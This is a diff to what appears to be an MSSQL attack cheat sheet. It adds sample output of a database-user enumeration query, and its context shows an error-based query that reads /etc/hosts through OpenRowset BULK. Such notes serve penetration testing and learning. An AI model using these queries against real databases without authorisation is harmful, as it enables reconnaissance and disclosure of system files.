@@ -279,6 +279,14 @@ CAST(CASE dp.state WHEN N'G' THEN 1 WHEN 'W' THEN 1 ELSE 0 END AS bit) AS [HasDB
 FROM sys.database_principals AS u LEFT OUTER JOIN sys.database_permissions AS dp ON dp.grantee_principal_id = u.principal_id and dp.type = 'CO'
 WHERE (u.type in ('U', 'S', 'G', 'C', 'K' ,'E', 'X')) ORDER BY [Name] ASC
 ```
+Response
+Name              |Urn                                                                                     |CreateDate             |ID|HasDBAccess|
+------------------|----------------------------------------------------------------------------------------|-----------------------|--|-----------|
+bruno             |Server[@Name='0af2ea7c41f4']/Database[@Name='teste_sa']/User[@Name='bruno']             |2024-01-23 12:57:21.647| 5|          1|
+dbo               |Server[@Name='0af2ea7c41f4']/Database[@Name='teste_sa']/User[@Name='dbo']               |2003-04-08 09:10:42.287| 1|          1|
+guest             |Server[@Name='0af2ea7c41f4']/Database[@Name='teste_sa']/User[@Name='guest']             |2003-04-08 09:10:42.317| 2|          0|
+INFORMATION_SCHEMA|Server[@Name='0af2ea7c41f4']/Database[@Name='teste_sa']/User[@Name='INFORMATION_SCHEMA']|2009-04-13 12:59:11.717| 3|          0|
+sys               |Server[@Name='0af2ea7c41f4']/Database[@Name='teste_sa']/User[@Name='sys']               |2009-04-13 12:59:11.717| 4|          0|0|
 ### Read localfile through errors
 ```
 Select cast((select x from OpenRowset(BULK '/etc/hosts',SINGLE_CLOB) R(x)) as int) 
